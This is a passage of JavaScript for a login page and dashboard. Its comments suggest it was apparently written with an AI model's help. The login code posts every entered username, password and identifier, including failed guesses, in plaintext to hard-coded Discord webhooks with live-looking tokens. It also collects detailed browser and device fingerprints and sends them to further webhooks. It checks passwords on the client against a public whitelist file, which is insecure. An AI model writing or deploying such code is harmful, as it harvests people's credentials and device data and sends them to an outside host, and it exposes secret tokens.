                const index = parseInt(e.target.dataset.index);
                if (!isNaN(index)) {
                    reminders.splice(index, 1);
                    renderReminders();
                    showAlert('Reminder marked as done!', 'info', 2000);
                    activityLogger.log('Reminder Marked Done', { index: index });
                }
            }
        });

        // Set min date for datetime input to prevent past dates
        const now = new Date();
        now.setMinutes(now.getMinutes() - now.getTimezoneOffset());
        reminderDatetimeInput.min = now.toISOString().slice(0, 16);

        renderReminders();
        setInterval(checkReminders, 10000); // Check every 10 seconds for alerts
      }, // End initReminders

      initActivityLoginHistoryPanels: function() {
          document.getElementById('clearActivityLogBtn').addEventListener('click', () => activityLogger.clearLogs());
          document.getElementById('exportActivityLogBtn').addEventListener('click', () => activityLogger.exportLogs());

          this.displayLoginHistory = function() {
              const loginHistoryContent = document.getElementById('loginHistoryContent');
              loginHistoryContent.innerHTML = '';
              const history = JSON.parse(localStorage.getItem('loginHistory') || '[]');

              if (history.length === 0) {
                  loginHistoryContent.innerHTML = '<p><em>No login history available.</em></p>';
                  return;
              }

              history.reverse().forEach(entry => { // Display newest first
                  const p = document.createElement('p');
                  p.innerHTML = `<span style="color:#00ffff;">[${new Date(entry.timestamp).toLocaleString()}]</span> <strong>User:</strong> <span style="color:#ffcc00;">${entry.username}</span> | <strong>ID:</strong> <span style="color:#ffcc00;">${entry.userID}</span>`;
                  loginHistoryContent.appendChild(p);
              });
          };

          this.displayLoginHistory(); // Initial display if panel is open
      },

      initKeybinds: function() {
        const keybindsConfigDiv = document.getElementById('keybindsConfig');
        const saveKeybindsBtn = document.getElementById('saveKeybindsBtn');

        let keybinds = JSON.parse(localStorage.getItem('userKeybinds') || '{}');

        // Default keybinds if not set
        const defaultKeybinds = {
            toggleNotes: 'N',
            panic: 'P',
            fullScreen: 'F',
            zoomIn: '=',
            zoomOut: '-',
            restart: 'R',
            toggleTheme: 'T'
            // Add other default keybinds here
        };

        // Merge saved keybinds with defaults, prioritize saved
        keybinds = { ...defaultKeybinds, ...keybinds };

        const updateKeybindInputs = () => {
            keybindsConfigDiv.querySelectorAll('.keybind-input').forEach(input => {
                const action = input.dataset.action;
                input.value = keybinds[action] || '';
                // Add click listener to change
                input.readOnly = true; // Ensure it's read-only until user clicks to edit
                input.style.cursor = 'pointer';

                input.onclick = () => {
                    input.value = 'Press key...';
                    input.readOnly = false;
                    input.focus();
                    const handleKey = (e) => {
                        e.preventDefault();
                        input.value = e.key.toUpperCase(); // Simple key handling
                        keybinds[action] = e.key.toUpperCase();
                        input.readOnly = true;
                        input.blur();
                        input.removeEventListener('keydown', handleKey);
                        activityLogger.log('Keybind Edited', { action, key: e.key.toUpperCase() });
                        showAlert(`Keybind for "${action}" set to "${e.key.toUpperCase()}".`, 'info', 2000);
                    };
                    input.addEventListener('keydown', handleKey, { once: true });
                    input.onblur = () => { // If user clicks away
                        input.removeEventListener('keydown', handleKey);
                        input.value = keybinds[action] || ''; // Revert if no key pressed
                        input.readOnly = true;
                    };
                };
            });
        };

        // Attach event listeners for actual keybinds
        const attachKeybindListeners = () => {
            document.removeEventListener('keydown', handleGlobalKeybind); // Remove old listener first
            document.addEventListener('keydown', handleGlobalKeybind);
        };

        const handleGlobalKeybind = (e) => {
            // Do not trigger keybinds if inputs are focused or during a reset popup
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || document.getElementById('resetPopup').style.display === 'block') {
                return;
            }

            const pressedKey = e.key.toUpperCase();

            // Iterate over all defined keybinds
            for (const action in keybinds) {
                if (keybinds[action] === pressedKey) {
                    e.preventDefault(); // Prevent default browser action for the key
                    switch (action) {
                        case 'toggleNotes':
                            document.getElementById('notesBtn').click();
                            break;
                        case 'panic':
                            document.getElementById('panicBtn').click();
                            break;
                        case 'fullScreen':
                            document.getElementById('fullScreenBtn').click();
                            break;
                        case 'zoomIn':
                            document.getElementById('zoomInBtn').click();
                            break;
                        case 'zoomOut':
                            document.getElementById('zoomOutBtn').click();
                            break;
                        case 'restart':
                            document.getElementById('restartBtn').click();
                            break;
                        case 'toggleTheme':
                            document.getElementById('themeToggle').click();
                            break;
                        // Add cases for other keybind actions here
                        default:
                            break;
                    }
                    activityLogger.log('Keybind Triggered', { action, key: pressedKey });
                    return; // Stop after first matched keybind
                }
            }
        };


        saveKeybindsBtn.addEventListener('click', () => {
            localStorage.setItem('userKeybinds', JSON.stringify(keybinds));
            attachKeybindListeners(); // Re-attach with updated keybinds
            showAlert('Keybinds saved successfully!', 'success');
            activityLogger.log('Keybinds Saved');
        });

        // Initialize on load
        updateKeybindInputs();
        attachKeybindListeners(); // Attach initial keybinds on dashboard load
      },

    }; // End dashboard object

    // Login System JavaScript
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // New logging system webhooks (expanded by user request - these are placeholders or specific new endpoints)
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHoIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks (as provided in user's code)
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLWCSBTtltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordToggle = document.getElementById('showPasswordToggle'); // Renamed
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      // Login page quick bar elements
      const loginPanicBtn = document.getElementById('loginPanicBtn');
      const loginZoomInBtn = document.getElementById('loginZoomInBtn');
      const loginZoomOutBtn = document.getElementById('loginZoomOutBtn');


      let attempts = 3; // Changed from 5 to 3
      let users = [];
      let loginTime = null;

      // Add a login history array
      let loginHistory = JSON.parse(localStorage.getItem('loginHistory') || '[]');

      function addLoginAttemptToHistory(username, userID, status, timestamp = new Date().toISOString()) {
        loginHistory.push({ username, userID, timestamp, status });
        localStorage.setItem('loginHistory', JSON.stringify(loginHistory));
        if (loginHistory.length > 20) { // Keep only last 20 entries
            loginHistory = loginHistory.slice(loginHistory.length - 20);
        }
      }

      // Pre-login animation sequence
      const initialLoadingScreen = document.getElementById('initialLoadingScreen');
      const loadingText = document.getElementById('loadingText');
      const loginContainer = document.getElementById('loginContainer');
      const loadingCube = document.getElementById('loadingCube');

      function startInitialLoad() {
        // Initializing System...
        loadingText.textContent = "Initializing System...";
        loadingCube.style.animation = 'rotateCube 3s infinite linear';

        setTimeout(() => {
          loadingText.textContent = "System Initialized.";
          loadingCube.style.animation = 'none'; // Stop rotation temporarily

          setTimeout(() => {
            // Initializing Login Page...
            loadingText.textContent = "Initializing Login Page...";
            loadingCube.style.animation = 'rotateCube 2s infinite linear';

            // Animation for cube to morph/expand to login box
            setTimeout(() => {
              initialLoadingScreen.style.opacity = '0';
              initialLoadingScreen.addEventListener('transitionend', () => {
                initialLoadingScreen.style.display = 'none';
                document.body.classList.remove('login-body'); // Remove default alignment from body
                loginContainer.style.display = 'flex'; // Make login content visible
                setTimeout(() => {
                    loginContainer.style.opacity = '1'; // Fade in login content
                    document.body.classList.add('login-body'); // Add specific login-body alignment
                    // Trigger cube "pop" effect onto the login box visually (CSS classes needed for a good morph)
                    loginBox.style.transform = 'scale(1)'; // Reset if scaled before
                }, 100);
              }, { once: true });
            }, 3000); // After "Initializing Login Page..." for 3 seconds
          }, 2000); // After "System Initialized" for 2 seconds
        }, 3000); // Initial "Initializing System..." for 3 seconds
      }

      // Initial Call
      startInitialLoad();

      // Show/hide password toggle (renamed element)
      showPasswordToggle.addEventListener('change', () => {
        passwordInput.type = showPasswordToggle.checked ? 'text' : 'password';
        activityLogger.log('Show Password Toggle', { checked: showPasswordToggle.checked, page: 'login' });
      });

      // Login Quick Bar actions
      loginPanicBtn.addEventListener('click', () => {
        activityLogger.log('Panic Button', { page: 'login' });
        window.open('https://clever.com', '_blank');
      });

      let loginZoomLevel = 1;
      const loginZoomStep = 0.1;
      const loginMinZoom = 0.5;
      const loginMaxZoom = 2;

      loginZoomInBtn.addEventListener('click', () => {
        activityLogger.log('Zoom In Button', { page: 'login' });
        if (loginZoomLevel < loginMaxZoom) {
          loginZoomLevel += loginZoomStep;
          document.body.style.zoom = loginZoomLevel;
        }
      });

      loginZoomOutBtn.addEventListener('click', () => {
        activityLogger.log('Zoom Out Button', { page: 'login' });
        if (loginZoomLevel > loginMinZoom) {
          loginZoomLevel -= loginZoomStep;
          document.body.style.zoom = loginZoomLevel;
        }
      });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => {
            if (!res.ok) {
                console.error(`HTTP error! status: ${res.status}`);
                throw new Error('Network response was not ok');
            }
            return res.json();
        })
        .then(data => {
            users = data;
        })
        .catch(error => {
            users = [];
            console.error('Failed to load user JSON data:', error);
            // Optionally, display an error message on the login page
            errorMsg.textContent = 'Failed to load user data. Please try again later.';
            submitBtn.disabled = true; // Disable login if data fails to load
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return {
              charging: battery.charging,
              level: battery.level,
              chargingTime: battery.chargingTime,
              dischargingTime: battery.dischargingTime,
            };
          } catch {
            return null;
          }
        }
        return null;
      }

      // Additional device/browser info
      function getScreenDetails() {
        return {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          orientationType: screen.orientation ? screen.orientation.type : 'N/A',
          orientationAngle: screen.orientation ? screen.orientation.angle : 'N/A',
        };
      }

      function getTimezone() {
        return Intl.DateTimeFormat().resolvedOptions().timeZone;
      }

      function getPluginsList() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
          plugins.push(navigator.plugins[i].name);
        }
        return plugins.join('; ');
      }

      async function getPublicIP() {
        try {
          // This requires a third-party service; I'll use a placeholder.
          // For actual implementation, use a reliable IP lookup API.
          // const response = await fetch('https://api.ipify.org?format=json');
          // const data = await response.json();
          // return data.ip;
          return 'Fetching... (simulated)';
        } catch (error) {
          console.error('Could not get public IP:', error);
          return 'Unavailable';
        }
      }


      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        if (!url || !embed) {
            console.warn("Attempted to send webhook without URL or embed data.");
            return;
        }
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();
        const screenDetails = getScreenDetails();
        const publicIP = await getPublicIP();
        const timezone = getTimezone();
        const plugins = getPluginsList();


        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
          screenDetails,
          publicIP,
          timezone,
          plugins,
          browserHeight: window.innerHeight,
          browserWidth: window.innerWidth,
          devicePixelRatio: window.devicePixelRatio,
          appVersion: navigator.appVersion, // Additional
          platform: navigator.platform, // For consistency
          languages: navigator.languages ? navigator.languages.join(", ") : "Unknown", // Added
          memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable", // Added
          cpuCores: navigator.hardwareConcurrency || "Unavailable", // Added
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders (with new fields from collectLoggingData)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true },
            // Additional logging info as requested
            { name: "Public IP Address", value: data.publicIP || "Unavailable", inline: false },
            { name: "Client Timezone", value: data.timezone || "Unknown", inline: true },
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: data.plugins || "None", inline: false }, // Using collected plugins
            { name: "Browser Window Size", value: `${data.browserWidth}x${data.browserHeight}`, inline: true },
            { name: "Device Pixel Ratio", value: data.devicePixelRatio?.toString() || "Unknown", inline: true }, // Changed from browser zoom
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: false },
            { name: "Browser Connection Speed (effectiveType)", value: nav.connection?.effectiveType || "Unknown", inline: true },
            // New logging information
            { name: "Browser App Version", value: data.appVersion || "Unknown", inline: false }, // Additional
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true } // still 'Undetected'
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        const screenDetails = data.screenDetails; // Using collected screen details

        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: data.platform || "Unknown", inline: true }, // Using collected platform
            { name: "CPU Cores", value: data.cpuCores || "Unavailable", inline: true },
            { name: "Device Memory", value: data.memory || "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution (Full)", value: `${screenDetails.width}x${screenDetails.height}`, inline: true }, // Using collected
            { name: "Screen Resolution (Available)", value: `${screenDetails.availWidth}x${screenDetails.availHeight}`, inline: true }, // New field
            { name: "Screen Orientation", value: screenDetails.orientationType || "Unavailable", inline: true },
            { name: "Screen Color Depth", value: `${screenDetails.colorDepth} bit`, inline: true },
            { name: "Screen Pixel Depth", value: `${screenDetails.pixelDepth} bit`, inline: true },
            // New logging information
            { name: "Screen Refresh Rate (Estimated)", value: "Unavailable (complex)", inline: true }, // Needs deeper browser API/calculation
            { name: "Time spent Charging (mins)", value: battery?.chargingTime !== Infinity ? `${(battery?.chargingTime / 60).toFixed(0)} mins` : 'Not charging/Estimating', inline: true }, // Additional
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
            { name: "IP Address (Public)", value: data.publicIP || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true }, // This is an assumed property
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true }, // This is an assumed property
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false }, // This is an assumed property
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            // New logging information
            { name: "Bandwidth Estimate", value: nav.connection?.bandwidth || "Unknown", inline: true }, // Renamed/Adjusted
            { name: "Current Network Latency", value: "Unavailable (realtime only)", inline: true }, // Additional, harder to get passively
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        const logoutTime = new Date().toISOString();
        const duration = loginTime ? new Date(logoutTime).getTime() - new Date(loginTime).getTime() : 0;
        const sessionDurationFormatted = duration > 0 ? `${Math.floor(duration / 3600000)}h ${Math.floor((duration % 3600000) / 60000)}m ${Math.floor((duration % 60000) / 1000)}s` : "Unknown";

        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: logoutTime, inline: true },
            { name: "Session Duration", value: sessionDurationFormatted, inline: true },
            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false }, // Assumed
            { name: "Actions Performed Count", value: (activityLogger.logs.length).toString(), inline: true }, // Using global activity logs
            { name: "Last Action (if any)", value: activityLogger.logs.length > 0 ? activityLogger.logs[activityLogger.logs.length - 1].event : "None", inline: true }, // Additional
            { name: "Errors Encountered (Client-side)", value: "None captured in logs yet", inline: false }, // Can be integrated later
            { name: "Warnings (Client-side)", value: "None captured in logs yet", inline: false }, // Can be integrated later
            { name: "User Role Changes", value: data.user.roleChanges?.join(", ") || "None", inline: false }, // Assumed
            { name: "Permission Changes", value: data.user.permissionChanges?.join(", ") || "None", inline: false }, // Assumed
            { name: "Login Status (Success/Failure)", value: "Success", inline: true }, // This will be dynamic based on the login outcome
            { name: "IP Address used for Login", value: data.publicIP || "Unavailable", inline: false }, // Additional
            { name: "User Device OS/Version", value: navigator.platform + ' ' + navigator.oscpu || "Unknown", inline: false }, // Additional, 'oscpu' might be outdated/not widely supported.
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt immediately for attempts_counter
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );
        addLoginAttemptToHistory(username, userID, 'attempt'); // Log attempt

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User or ID not found.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login sequence
        attempts = 3; // Reset attempts on success
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';

        addLoginAttemptToHistory(username, userID, 'success'); // Log successful login

        // Log successful credentials to webhooks
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect comprehensive logging data
        const loggingData = await collectLoggingData(user, password);

        // Send all comprehensive webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)), // This embed gets updated on logout typically
        ]);

        // Hide login page, show dashboard loading
        loginContainer.style.opacity = '0';
        loginContainer.addEventListener('transitionend', () => {
          loginContainer.style.display = 'none';
          document.body.className = ''; // Clear login-body specific classes temporarily

          const dashboardLoadingScreen = document.getElementById('dashboardLoadingScreen');
          dashboardLoadingScreen.style.display = 'flex';
          dashboardLoadingScreen.style.opacity = '1';
          dashboardLoadingScreen.classList.add('fade-in'); // For visual transition

          // --- Dashboard Loading Animation ---
          const loadingCubeElement = dashboardLoadingScreen.querySelector('.dashboard-loading-box');
          loadingCubeElement.style.animation = 'rotateCube 3s infinite linear';

          const codeLines = [
            "STATUS: [OK] INITIALIZING_CORE_SYSTEMS",
            "SCANNING: DEPENDENCIES.XML",
            "LOADING: USER_PROFILE",
            "ESTABLISHING: ENCRYPTED_CONNECTION",
            "CHECKING: DATABASE_INTEGRITY...",
            "INITIALIZING: DASHBOARD_GUI_ELEMENTS...",
            "SUCCESS: CONNECTION_ESTABLISHED",
            "OPTIMIZING: UI_PERFORMANCE...",
            "AWAITING: USER_INTERFACE_RENDER",
            "READY: SYSTEM_ONLINE"
          ];
          const codeArea = document.getElementById('dashboardLoadingCode');
          let lineIndex = 0;
          let charIndex = 0;
          let currentLineDiv;

          function typeNextLine() {
            if (lineIndex < codeLines.length) {
              if (charIndex === 0) { // New line
                currentLineDiv = document.createElement('p');
                currentLineDiv.classList.add('loading-code-line');
                currentLineDiv.style.animationDelay = `${lineIndex * 0.1}s`; // Stagger animation
                codeArea.appendChild(currentLineDiv);
                codeArea.scrollTop = codeArea.scrollHeight; // Scroll to bottom
              }
              currentLineDiv.textContent += codeLines[lineIndex][charIndex];
              charIndex++;

              if (charIndex < codeLines[lineIndex].length) {
                setTimeout(typeNextLine, 30); // Typing speed
              } else {
                lineIndex++;
                charIndex = 0;
                setTimeout(typeNextLine, 500); // Delay before next line
              }
            } else {
              // All lines typed, proceed to dashboard
              setTimeout(() => {
                dashboardLoadingScreen.style.opacity = '0';
                dashboardLoadingScreen.addEventListener('transitionend', () => {
                  dashboardLoadingScreen.style.display = 'none';
                  document.getElementById('dashboard').style.display = 'block';
                  document.body.classList.add('dashboard-body'); // Set dashboard body class
                  
                  // Update user info in dashboard
                  document.getElementById('loggedInUser').textContent = user.name || username;
                  document.getElementById('loggedInID').textContent = userID;

                  // Save login info to localStorage to persist user identity after refresh/close
                  localStorage.setItem('loggedInUser', user.name || username);
                  localStorage.setItem('loggedInID', userID);

                  // Initialize dashboard functionality
                  dashboard.init();

                  // Show "Welcome (user)" notification
                  showAlert(`Welcome ${user.name || username}!`, 'success', 5000);

                }, { once: true });
              }, 1000); // Give a second to read "READY"
            }
          }
          typeNextLine();
        }, { once: true });

      } // End submitLogin

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
